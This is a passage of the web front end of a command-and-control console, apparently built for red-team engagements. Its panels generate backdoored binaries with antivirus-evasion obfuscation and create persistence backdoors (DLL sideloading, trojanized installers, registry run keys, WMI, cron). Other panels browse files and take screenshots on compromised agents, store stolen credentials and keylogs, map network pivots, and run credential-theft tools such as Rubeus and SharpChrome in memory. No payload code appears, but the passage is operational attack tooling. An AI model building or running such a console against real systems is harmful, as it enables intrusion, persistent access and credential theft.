                <label style="display:flex;align-items:center;gap:6px;cursor:pointer;padding:9px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;color:var(--text-primary);">
                  <input type="radio" name="bd-obfuscate" value="none" checked style="accent-color:#a78bfa;"> None
                  <span style="color:var(--text-muted);font-size:10px;margin-left:auto;">standard</span>
                </label>
                <label style="display:flex;align-items:center;gap:6px;cursor:pointer;padding:9px 12px;background:rgba(139,92,246,0.08);border:1px solid rgba(139,92,246,0.3);border-radius:var(--radius);font-size:12px;color:var(--text-primary);">
                  <input type="radio" name="bd-obfuscate" value="garble" style="accent-color:#a78bfa;"> <span style="color:#a78bfa;font-weight:700;">Garble</span>
                  <span style="color:var(--text-muted);font-size:10px;margin-left:auto;">AV bypass</span>
                </label>
              </div>
            </div>

            <!-- Generate button -->
            <button onclick="backdoorBinary()" id="bd-btn" style="width:100%;padding:12px;font-size:14px;font-weight:700;background:linear-gradient(135deg,rgba(139,92,246,0.8),rgba(99,102,241,0.8));border:none;border-radius:var(--radius);color:#fff;cursor:pointer;transition:opacity .15s;letter-spacing:0.3px;" onmouseover="this.style.opacity='.85'" onmouseout="this.style.opacity='1'">
              💉 &nbsp;Backdoor Binary
            </button>

            <!-- Result area -->
            <div id="bd-result" style="margin-top:12px;font-size:13px;"></div>
          </div>
        </div>

        <div class="card">
          <div class="card-header" style="display:flex;align-items:center;justify-content:space-between">
            <h3 style="margin:0;display:flex;align-items:center;gap:8px"><span>🔓</span> Persistence Backdoors</h3>
            <span id="bd-os-badge" style="font-size:10px;font-weight:700;padding:3px 8px;border-radius:10px;background:rgba(99,102,241,0.15);color:var(--purple);border:1px solid rgba(99,102,241,0.3);letter-spacing:0.5px">WINDOWS</span>
          </div>
          <div class="card-body padded">
            <div style="margin-bottom:12px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Backdoor Type</label>
              <select id="bd-type" onchange="bdTypeChanged()" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
                <optgroup label="── Windows ──" style="color:var(--text-muted)">
                  <option value="dll-sideload">DLL Sideloading</option>
                  <option value="lnk">LNK Shortcut Backdoor</option>
                  <option value="installer">Installer Wrapper (Trojanized Setup)</option>
                  <option value="service-dll">Windows Service DLL</option>
                  <option value="registry">Registry Run Key</option>
                  <option value="schtask">Scheduled Task (every 15min)</option>
                  <option value="wmi">WMI Event (fileless)</option>
                  <option value="office-template">Office Template Macro</option>
                  <option value="startup">Startup Folder VBScript</option>
                </optgroup>
                <optgroup label="── Linux ──" style="color:var(--text-muted)">
                  <option value="bashrc">Bash RC + Cron + Systemd</option>
                </optgroup>
              </select>
            </div>

            <div id="bd-opsec-bar" style="margin-bottom:12px;padding:7px 10px;border-radius:6px;font-size:11px;display:flex;align-items:center;gap:6px;background:rgba(234,179,8,0.08);border:1px solid rgba(234,179,8,0.25);color:#ca8a04"></div>

            <div id="bd-target-app-wrap" style="margin-bottom:12px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Target App</label>
              <input type="text" id="bd-target-app" placeholder="teams, chrome, slack, notepad..." style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px">
            </div>

            <div style="margin-bottom:14px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:4px">Listener URL</label>
              <div style="display:flex;gap:6px">
                <select id="bd-persist-listener-sel" onchange="bdListenerSelChanged()" style="flex:1;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
                  <option value="">-- Select active listener --</option>
                </select>
              </div>
              <input type="text" id="bd-persist-url" placeholder="or type custom URL..." style="width:100%;margin-top:6px;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace;box-sizing:border-box">
            </div>

            <button onclick="generatePersistBackdoor()" id="bd-persist-btn" style="width:100%;padding:12px;font-size:14px;font-weight:700;background:linear-gradient(135deg,rgba(99,102,241,0.8),rgba(139,92,246,0.8));border:none;border-radius:var(--radius);color:#fff;cursor:pointer;transition:opacity .15s;letter-spacing:0.3px" onmouseover="this.style.opacity='.85'" onmouseout="this.style.opacity='1'">
              🔓 &nbsp;Generate Backdoor
            </button>

            <div id="bd-persist-result" style="margin-top:12px"></div>
          </div>
        </div>
      </div>

      <!-- Payload History (like Mythic) -->
      <div class="card" style="margin-top:14px">
        <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
          <h3><span>📦</span> Payload History</h3>
          <button class="qbtn" onclick="loadPayloadHistory()" style="font-size:11px">Refresh</button>
        </div>
        <div class="card-body"><table>
          <thead><tr><th>ID</th><th>Type</th><th>Filename</th><th>Size</th><th>Listener</th><th>Created</th><th></th></tr></thead>
          <tbody id="payload-history-table"></tbody>
        </table></div>
      </div>
    </div>

    <!-- ══════ FILES / SCREENSHOTS / PROCESSES ══════ -->
    <div id="p-files" class="page">

      <!-- Agent selector -->
      <div style="display:flex;gap:12px;align-items:center;margin-bottom:16px;">
        <span style="color:var(--text-muted);font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:1px;">Target Agent</span>
        <div class="select-wrap">
          <select id="fb-agent" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;min-width:220px;">
            <option value="">Select an agent...</option>
          </select>
        </div>
      </div>

      <!-- Three panels side by side -->
      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin-bottom:16px;">

        <!-- File Browser -->
        <div class="card">
          <div class="card-header"><h3><span>📂</span> File Browser</h3></div>
          <div class="card-body padded">
            <div style="display:flex;gap:8px;margin-bottom:12px;">
              <input type="text" id="fb-path" placeholder="/ or C:\\" style="flex:1;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace;">
              <button class="btn" onclick="browseFiles()" style="padding:8px 14px;font-size:12px;">Browse</button>
            </div>
            <div style="display:flex;gap:6px;margin-bottom:10px;">
              <button class="qbtn" onclick="fbGoUp()" title="Go to parent directory">⬆ Up</button>
              <button class="qbtn" onclick="browseFiles()" title="Refresh current directory">🔄 Refresh</button>
            </div>
            <div id="fb-quick-btns" class="quick-actions" style="margin-bottom:10px;">
              <button class="qbtn" onclick="browseDir('/')">/ (root)</button>
              <button class="qbtn" onclick="browseDir('/home')">home</button>
              <button class="qbtn" onclick="browseDir('/etc')">etc</button>
              <button class="qbtn" onclick="browseDir('/tmp')">tmp</button>
            </div>
            <div id="fb-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:12px;min-height:200px;max-height:350px;overflow-y:auto;font-family:monospace;font-size:12px;color:var(--text-muted);white-space:pre-wrap;">
              Select an agent and path, then click Browse.
            </div>
          </div>
        </div>

        <!-- Screenshot -->
        <div class="card">
          <div class="card-header"><h3><span>📸</span> Screenshot</h3></div>
          <div class="card-body padded">
            <button class="btn" onclick="requestScreenshot()" style="width:100%;padding:10px;font-size:13px;margin-bottom:12px;">📸 Capture Screenshot</button>
            <div id="ss-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:12px;min-height:200px;display:flex;align-items:center;justify-content:center;">
              <div style="text-align:center;color:var(--text-muted);">
                <div style="font-size:40px;opacity:0.3;margin-bottom:8px;">📸</div>
                <p style="font-size:12px;">Click capture to request a screenshot from the agent.</p>
                <p style="font-size:11px;margin-top:4px;">Results appear in the agent's task history.</p>
              </div>
            </div>
          </div>
        </div>

        <!-- Process List -->
        <div class="card">
          <div class="card-header"><h3><span>⚙️</span> Process List</h3></div>
          <div class="card-body padded">
            <button class="btn" onclick="requestProcessList()" style="width:100%;padding:10px;font-size:13px;margin-bottom:12px;">⚙️ List Processes</button>
            <div id="ps-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:12px;min-height:200px;max-height:350px;overflow-y:auto;font-family:monospace;font-size:11px;color:var(--text-muted);white-space:pre-wrap;">
              Click to request the running process list from the agent.
            </div>
          </div>
        </div>
      </div>

      <!-- Agent Notes -->
      <div class="card">
        <div class="card-header"><h3><span>📝</span> Agent Notes</h3></div>
        <div class="card-body padded">
          <div style="display:flex;gap:8px;margin-bottom:12px;">
            <input type="text" id="note-input" placeholder="Add a note (creds, findings, pivot info...)" style="flex:1;padding:10px 14px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;" onkeydown="if(event.key==='Enter')addNote()">
            <button class="btn" onclick="addNote()" style="padding:10px 16px;">Add Note</button>
          </div>
          <div id="notes-list" style="max-height:200px;overflow-y:auto;">
            <div style="color:var(--text-muted);font-size:12px;padding:8px;">Select an agent to view notes.</div>
          </div>
        </div>
      </div>

      <!-- Search Output -->
      <div class="card">
        <div class="card-header"><h3><span>🔍</span> Search Task Output</h3></div>
        <div class="card-body padded">
          <div style="display:flex;gap:8px;margin-bottom:12px;">
            <input type="text" id="search-input" placeholder="Search across all agent output (passwords, hashes, configs...)" style="flex:1;padding:10px 14px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;" onkeydown="if(event.key==='Enter')searchOutput()">
            <button class="btn" onclick="searchOutput()" style="padding:10px 16px;">Search</button>
          </div>
          <div id="search-results" style="max-height:300px;overflow-y:auto;">
            <div style="color:var(--text-muted);font-size:12px;padding:8px;">Search results will appear here.</div>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ CREDENTIALS ══════ -->
    <div id="p-creds" class="page">
      <div class="card">
        <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
          <h3><span>🔑</span> Credential Manager</h3>
          <button class="qbtn" onclick="showAddCred()" style="font-size:11px">+ Add Credential</button>
        </div>
        <div class="card-body">
          <div id="add-cred-form" style="display:none;margin-bottom:16px;padding:14px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius)">
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr 1fr auto;gap:8px;align-items:end">
              <div><label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Source</label><input id="cred-source" placeholder="ds-gateway" style="width:100%;padding:6px 8px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px"></div>
              <div><label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Username</label><input id="cred-user" placeholder="admin" style="width:100%;padding:6px 8px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px"></div>
              <div><label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Password/Hash</label><input id="cred-pass" placeholder="P@ssword" style="width:100%;padding:6px 8px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace"></div>
              <div><label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Type</label><select id="cred-type" style="width:100%;padding:6px 8px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px"><option>password</option><option>hash</option><option>token</option><option>key</option><option>cookie</option></select></div>
              <button class="qbtn" onclick="addCred()" style="padding:6px 14px;font-size:12px;background:var(--accent-glow);color:var(--accent-light)">Save</button>
            </div>
          </div>
          <table>
            <thead><tr><th>Source</th><th>Username</th><th>Password/Hash</th><th>Type</th><th>Added</th><th></th></tr></thead>
            <tbody id="cred-table"></tbody>
          </table>
        </div>
      </div>
    </div>

    <!-- ══════ LOOT ══════ -->
    <div id="p-loot" class="page">
      <div class="card">
        <div class="card-header"><h3><span>🎯</span> Loot Viewer</h3></div>
        <div class="card-body">
          <div style="display:flex;gap:8px;margin-bottom:14px">
            <select id="loot-filter" onchange="loadLoot()" style="padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
              <option value="all">All Types</option>
              <option value="credentials">Credentials</option>
              <option value="file">Files</option>
              <option value="screenshot">Screenshots</option>
              <option value="keylog">Keylogs</option>
              <option value="sysinfo">Sysinfo</option>
              <option value="output">Shell Output</option>
            </select>
            <button class="qbtn" onclick="loadLoot()" style="font-size:12px">Refresh</button>
          </div>
          <div id="loot-grid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:12px"></div>
        </div>
      </div>
    </div>

    <!-- ══════ PIVOT GRAPH ══════ -->
    <div id="p-pivotgraph" class="page">
      <div class="card">
        <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
          <h3><span>🗺️</span> Network Pivot Map</h3>
          <button class="qbtn" onclick="drawPivotGraph()" style="font-size:11px">Refresh</button>
        </div>
        <div class="card-body">
          <canvas id="pivot-canvas" width="900" height="500" style="width:100%;background:var(--bg-input);border-radius:var(--radius);border:1px solid var(--border)"></canvas>
          <div style="margin-top:10px;display:flex;gap:16px;justify-content:center;font-size:11px;color:var(--text-muted)">
            <span><span style="color:var(--green)">●</span> Active Agent</span>
            <span><span style="color:var(--red)">●</span> Dead Agent</span>
            <span><span style="color:var(--yellow)">●</span> Pivot Host</span>
            <span style="color:var(--accent-light)">─── SSH Pivot</span>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ IOC DASHBOARD ══════ -->
    <div id="p-ioc" class="page">
      <div class="card">
        <div class="card-header"><h3><span>🚨</span> Indicators of Compromise (IOC) Dashboard</h3></div>
        <div class="card-body">
          <div style="margin-bottom:14px;color:var(--text-muted);font-size:12px">Tracks artifacts generated during the engagement that defenders could detect.</div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px" id="ioc-grid">
            <div class="card" style="margin:0">
              <div class="card-header"><h3 style="font-size:14px"><span>📂</span> Files Dropped</h3></div>
              <div class="card-body" id="ioc-files" style="font-family:monospace;font-size:11px;max-height:250px;overflow-y:auto"></div>
            </div>
            <div class="card" style="margin:0">
              <div class="card-header"><h3 style="font-size:14px"><span>🌐</span> Network Connections</h3></div>
              <div class="card-body" id="ioc-network" style="font-family:monospace;font-size:11px;max-height:250px;overflow-y:auto"></div>
            </div>
            <div class="card" style="margin:0">
              <div class="card-header"><h3 style="font-size:14px"><span>⚙️</span> Processes Created</h3></div>
              <div class="card-body" id="ioc-procs" style="font-family:monospace;font-size:11px;max-height:250px;overflow-y:auto"></div>
            </div>
            <div class="card" style="margin:0">
              <div class="card-header"><h3 style="font-size:14px"><span>🔧</span> Registry / Persistence</h3></div>
              <div class="card-body" id="ioc-persist" style="font-family:monospace;font-size:11px;max-height:250px;overflow-y:auto"></div>
            </div>
          </div>
        </div>
      </div>
      <div class="card" style="margin-top:14px">
        <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
          <h3><span>📜</span> Session Replay</h3>
          <select id="replay-agent" onchange="loadReplay()" style="padding:6px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
            <option value="">Select agent...</option>
          </select>
        </div>
        <div class="card-body">
          <div id="replay-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:14px;min-height:200px;max-height:400px;overflow-y:auto;font-family:monospace;font-size:11px;white-space:pre-wrap;color:var(--text-muted)">
            Select an agent to replay its session history.
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ TEMPLATES ══════ -->
    <div id="p-templates" class="page">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">
        <div class="card">
          <div class="card-header"><h3><span>📑</span> Command Templates</h3></div>
          <div class="card-body" id="template-list"></div>
        </div>
        <div class="card">
          <div class="card-header"><h3><span>🛡️</span> MITRE ATT&CK Mapping</h3></div>
          <div class="card-body">
            <div style="font-size:12px;color:var(--text-muted);margin-bottom:12px">Commands are mapped to MITRE ATT&CK techniques</div>
            <div id="mitre-map" style="display:grid;grid-template-columns:1fr 1fr;gap:6px"></div>
          </div>
        </div>
      </div>
      <div class="card" style="margin-top:14px">
        <div class="card-header"><h3><span>⚡</span> Auto-Tasks (Run on New Agent)</h3></div>
        <div class="card-body">
          <div style="display:flex;gap:8px;margin-bottom:12px">
            <select id="at-cmd" style="padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;width:150px">
              <option value="sysinfo">sysinfo</option>
              <option value="ifconfig">ifconfig</option>
              <option value="shell">shell</option>
              <option value="ps">ps</option>
              <option value="screenshot">screenshot</option>
            </select>
            <input id="at-args" placeholder="args (optional)" style="flex:1;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
            <button class="qbtn" onclick="addAutoTask()" style="padding:8px 14px;font-size:12px">+ Add</button>
          </div>
          <div id="autotask-list"></div>
        </div>
      </div>
    </div>

    <!-- ══════ AUDIT ══════ -->
    <div id="p-audit" class="page">
      <div class="card">
        <div class="card-header"><h3><span>📝</span> Operator Audit Log</h3></div>
        <div class="card-body"><table>
          <thead><tr><th>Time</th><th>Operator</th><th>Agent</th><th>Action</th><th>Detail</th></tr></thead>
          <tbody id="audit-table"></tbody>
        </table></div>
      </div>
    </div>

    <!-- ══════ SETTINGS ══════ -->
    <div id="p-settings" class="page">
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">

        <!-- API Keys -->
        <div class="card">
          <div class="card-header"><h3><span>🔐</span> API Keys</h3></div>
          <div class="card-body padded">
            <p style="font-size:12px;color:var(--text-muted);margin-bottom:12px">Generate API keys for scripting and automation. Use with <code>X-API-Key</code> header or <code>Authorization: Bearer</code>.</p>
            <div style="display:flex;gap:8px;margin-bottom:12px">
              <input id="apikey-name" placeholder="Key name (e.g., automation)" style="flex:1;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
              <button class="qbtn" onclick="createAPIKey()" style="font-size:12px;padding:8px 14px">Generate Key</button>
            </div>
            <div id="apikey-result" style="margin-bottom:12px"></div>
            <div id="apikey-list"></div>
          </div>
        </div>

        <!-- Task Queue -->
        <div class="card">
          <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
            <h3><span>⏳</span> Task Queue</h3>
            <button class="qbtn" onclick="loadTaskQueue()" style="font-size:11px">Refresh</button>
          </div>
          <div class="card-body">
            <table>
              <thead><tr><th>Agent</th><th>Type</th><th>Args</th><th>Status</th><th>Created</th></tr></thead>
              <tbody id="taskqueue-table"></tbody>
            </table>
          </div>
        </div>

        <!-- File Upload to Agent -->
        <div class="card">
          <div class="card-header"><h3><span>📤</span> Upload File to Agent</h3></div>
          <div class="card-body padded">
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;margin-bottom:4px">Target Agent</label>
              <select id="upload-agent" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
                <option value="">Select agent...</option>
              </select>
            </div>
            <div style="margin-bottom:10px">
              <label style="display:block;font-size:11px;color:var(--text-muted);text-transform:uppercase;margin-bottom:4px">Remote Path (optional)</label>
              <input id="upload-path" placeholder="Auto: /tmp/filename or C:\Users\Public\filename" style="width:100%;padding:8px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
            </div>
            <div style="margin-bottom:10px;padding:20px;border:2px dashed var(--border);border-radius:var(--radius);text-align:center;cursor:pointer" onclick="document.getElementById('upload-file').click()" id="upload-dropzone">
              <div style="font-size:24px;margin-bottom:6px">📂</div>
              <div style="font-size:12px;color:var(--text-muted)">Click or drag file here</div>
              <input type="file" id="upload-file" style="display:none" onchange="updateDropzone(this)">
            </div>
            <button class="btn" onclick="uploadToAgent()" style="width:100%;padding:10px;font-size:13px">📤 Upload</button>
            <div id="upload-result" style="margin-top:8px;font-size:12px"></div>
          </div>
        </div>

        <!-- Agent Health -->
        <div class="card">
          <div class="card-header"><h3><span>💓</span> Agent Health</h3></div>
          <div class="card-body">
            <canvas id="health-chart" height="200" style="width:100%"></canvas>
          </div>
        </div>
      </div>

      <!-- .NET Assembly Execution Panel -->
      <div class="card" style="margin-top:14px">
        <div class="card-header"><h3><span>⚡</span> .NET Assembly Execution</h3></div>
        <div class="card-body padded">
          <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px">Upload and execute .NET assemblies in-memory (Seatbelt, Rubeus, SharpHound, Certify, etc). No file dropped to disk.</p>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px">

            <!-- Upload & Execute -->
            <div style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
              <h4 style="color:var(--accent-light);font-size:13px;margin-bottom:10px">📤 Upload & Execute</h4>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Target Agent</label>
                <select id="asm-agent" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
                  <option value="">Select agent...</option>
                </select>
              </div>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">.NET Assembly (.exe)</label>
                <input type="file" id="asm-file" style="display:none" accept=".exe,.dll" onchange="asmFileSelected(this)">
                <div style="padding:14px;border:2px dashed var(--border);border-radius:var(--radius);text-align:center;cursor:pointer" onclick="document.getElementById('asm-file').click()" id="asm-dropzone">
                  <div style="font-size:20px;margin-bottom:4px">⚡</div>
                  <div style="font-size:11px;color:var(--text-muted)">Click to select .NET assembly</div>
                </div>
              </div>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Arguments</label>
                <input id="asm-args" placeholder="-group=all or kerberoast" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
              </div>
              <button class="btn" onclick="executeAssemblyUpload()" style="width:100%;padding:10px;font-size:13px">⚡ Execute In-Memory</button>
              <div id="asm-upload-result" style="margin-top:8px;font-size:12px"></div>
            </div>

            <!-- Inline Base64 -->
            <div style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:16px">
              <h4 style="color:var(--accent-light);font-size:13px;margin-bottom:10px">📋 Inline Execute (Base64)</h4>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Target Agent</label>
                <select id="asm-inline-agent" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px">
                  <option value="">Select agent...</option>
                </select>
              </div>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Base64 Assembly</label>
                <textarea id="asm-b64" placeholder="Paste base64-encoded .NET assembly..." style="width:100%;height:80px;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:11px;font-family:monospace;resize:vertical"></textarea>
              </div>
              <div style="margin-bottom:8px">
                <label style="display:block;font-size:10px;color:var(--text-muted);text-transform:uppercase;margin-bottom:3px">Arguments</label>
                <input id="asm-inline-args" placeholder="kerberoast /domain:corp.local" style="width:100%;padding:7px 10px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
              </div>
              <button class="btn" onclick="executeAssemblyInline()" style="width:100%;padding:10px;font-size:13px">⚡ Execute Inline</button>
              <div id="asm-inline-result" style="margin-top:8px;font-size:12px"></div>
            </div>
          </div>

          <!-- Quick Presets -->
          <div style="margin-top:12px;padding:12px;background:var(--bg-primary);border:1px solid var(--border);border-radius:var(--radius)">
            <div style="font-size:11px;color:var(--text-muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:1px">Common Assemblies (upload .exe first, then click)</div>
            <div style="display:flex;flex-wrap:wrap;gap:6px">
              <button class="qbtn" onclick="setAsmArgs('-group=all')" style="font-size:10px;padding:4px 10px">Seatbelt -group=all</button>
              <button class="qbtn" onclick="setAsmArgs('kerberoast')" style="font-size:10px;padding:4px 10px">Rubeus kerberoast</button>
              <button class="qbtn" onclick="setAsmArgs('asreproast')" style="font-size:10px;padding:4px 10px">Rubeus asreproast</button>
              <button class="qbtn" onclick="setAsmArgs('-c All')" style="font-size:10px;padding:4px 10px">SharpHound -c All</button>
              <button class="qbtn" onclick="setAsmArgs('find /vulnerable')" style="font-size:10px;padding:4px 10px">Certify find /vulnerable</button>
              <button class="qbtn" onclick="setAsmArgs('triage')" style="font-size:10px;padding:4px 10px">SharpDPAPI triage</button>
              <button class="qbtn" onclick="setAsmArgs('all')" style="font-size:10px;padding:4px 10px">SharpUp all</button>
              <button class="qbtn" onclick="setAsmArgs('logins')" style="font-size:10px;padding:4px 10px">SharpChrome logins</button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ══════ EVENTS ══════ -->
    <div id="p-events" class="page">
      <div style="display:grid;grid-template-columns:2fr 1fr;gap:14px">
        <div class="card">
          <div class="card-header"><h3><span>📜</span> Event Log</h3></div>
          <div class="card-body">
            <div class="event-log" id="event-log"><div class="event-item" style="color:var(--text-muted)">No events yet...</div></div>
          </div>
        </div>
        <div class="card">
          <div class="card-header"><h3><span>📝</span> Engagement Notes</h3></div>
          <div class="card-body">
            <textarea id="engagement-notes-text" placeholder="Document findings, observations, next steps..." onchange="saveEngagementNotes()" style="width:100%;min-height:300px;padding:12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace;resize:vertical;line-height:1.6"></textarea>
            <div style="font-size:10px;color:var(--text-muted);margin-top:4px">Auto-saved to browser localStorage</div>
          </div>
        </div>
      </div>
    </div>

  </div>
</div>

<script>
// ──── State ────
let cmdHistory = [], historyIdx = -1;

// ──── Navigation ────
function nav(page) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById('p-' + page).classList.add('active');
  document.querySelectorAll('.sidebar-btn').forEach(b => b.classList.remove('active'));
  // Find the clicked sidebar button and activate it
  const btn = event ? event.target.closest('.sidebar-btn') : null;
  if (btn) btn.classList.add('active');
  if (page === 'terminal') document.getElementById('term-input').focus();
}

// ──── Helpers ────
function badge(s) {
  const m = {'active':'b-active','running':'b-running','complete':'b-complete','dormant':'b-dormant','pending':'b-pending','sent':'b-sent','dead':'b-dead','stopped':'b-stopped','error':'b-error'};
  const dot = ['active','dormant','dead'].includes(s) ? '<span class="badge-dot"></span>' : '';
  return '<span class="badge '+(m[s]||'b-pending')+'">'+dot+s+'</span>';
}
function osIcon(os) {
  if (os==='windows') return '<span style="display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;background:rgba(59,130,246,0.15);border-radius:4px;font-size:11px" title="Windows">⊞</span>';
  if (os==='linux') return '<span style="display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;background:rgba(245,158,11,0.15);border-radius:4px;font-size:11px" title="Linux">🐧</span>';
  if (os==='android') return '<span style="display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;background:rgba(16,185,129,0.15);border-radius:4px;font-size:11px" title="Android">📱</span>';
  if (os==='ios') return '<span style="display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;background:rgba(156,163,175,0.15);border-radius:4px;font-size:11px" title="iOS">🍎</span>';
  return '<span style="display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px;background:rgba(124,58,237,0.15);border-radius:4px;font-size:11px">💻</span>';
}
// Plain-text variant for use inside <option> elements — browsers don't render HTML in options
function osIconChar(os) {
  if (os==='windows') return '⊞';
  if (os==='linux')   return '🐧';
  if (os==='android') return '📱';
  if (os==='ios')     return '🍎';
  return '💻';
}
async function fetchJ(u) { try { return await (await fetch(u)).json(); } catch(e) { return []; } }

// ──── Data Refresh ────
async function refreshAll() {
  const agents = await fetchJ('/api/agents');
  const listeners = await fetchJ('/api/listeners');
  window._cachedListeners = listeners;
  populateListenerSelector();
  populateBackdoorListeners();
  bdTypeChanged();
  plCategory('agent');
  loadBinaryList();
  const tasks = await fetchJ('/api/tasks');
  const events = await fetchJ('/api/events') || [];

  const activeAgents = agents.filter(a => a.status==='active').length;

  // Stats
  document.getElementById('s-agents').textContent = activeAgents;
  document.getElementById('s-agents-sub').textContent = agents.length + ' total, ' + activeAgents + ' active';
  document.getElementById('s-listeners').textContent = listeners.filter(l=>l.status==='running').length;
  document.getElementById('s-listeners-sub').textContent = listeners.length + ' configured';
  const completedTasks = tasks.filter(t=>t.status==='complete').length;
  document.getElementById('s-tasks').textContent = completedTasks;
  document.getElementById('s-tasks-sub').textContent = tasks.length + ' total';
  document.getElementById('s-events').textContent = events.length;
  document.getElementById('s-events-sub').textContent = events.length > 0 ? 'Latest activity tracked' : '—';

  // Agent badge count + notification
  const sbBadge = document.getElementById('sb-agents');
  if (activeAgents > 0) { sbBadge.style.display='flex'; sbBadge.textContent=activeAgents; }
  else { sbBadge.style.display='none'; }
  if (activeAgents > lastAgentCount && lastAgentCount > 0) {
    const newAgent = agents.find(a => a.status === 'active');
    if (newAgent) notifyNewAgent(newAgent.name, newAgent.hostname);
  }
  lastAgentCount = activeAgents;

  // Dashboard agents (card view) — only rebuild when agent list changes
  const wrap = document.getElementById('dash-agents-wrap');
